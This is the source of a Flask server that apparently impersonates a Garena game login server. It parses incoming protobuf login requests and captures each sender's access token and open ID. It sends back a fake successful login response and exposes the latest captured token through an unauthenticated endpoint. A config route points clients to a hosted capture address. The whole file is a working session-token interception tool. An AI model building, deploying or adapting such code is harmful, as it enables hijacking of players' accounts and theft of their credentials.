import os
from flask import Flask, request, jsonify, render_template
from MajorLoginReq_pb2 import MajorLogin
from MajorLoginRes_pb2 import MajorLoginRes
import json
import time

app = Flask(__name__)

tokens = {}

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/config', methods=['GET'])
def config():
    return jsonify({
        "verAddr": "https://accesstoken-i0dx.onrender.com/api/capture",
        "tokenCapture": True,
        "version": "1.0.0"
    })

@app.route('/api/capture', methods=['POST'])
def capture():
    global tokens
    raw = request.get_data()
    
    try:
        req = MajorLogin()
        req.ParseFromString(raw)
        
        token = req.access_token
        open_id = req.open_id
        
        if token:
            tokens['latest'] = {
                'access_token': token,
                'open_id': open_id,
                'timestamp': time.time()
            }
            print(f"[+] Token: {token[:20]}...")
            print(f"[+] Open ID: {open_id}")
            
    except Exception as e:
        print(f"[-] Decode error: {e}")
    
    res = MajorLoginRes()
    res.account_id = 123456789
    res.token = "dummy"
    res.ttl = 3600
    res.server_url = "https://game.garena.com"
    res.queue_info.Allow = True
    res.queue_info.queue_position = 0
    res.queue_info.need_wait_secs = 0
    
    return res.SerializeToString(), 200, {'Content-Type': 'application/octet-stream'}

@app.route('/api/get-token', methods=['GET'])
def get_token():
    data = tokens.get('latest')
    if data:
        return jsonify(data)
    return jsonify({"error": "No token captured yet"}), 404

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)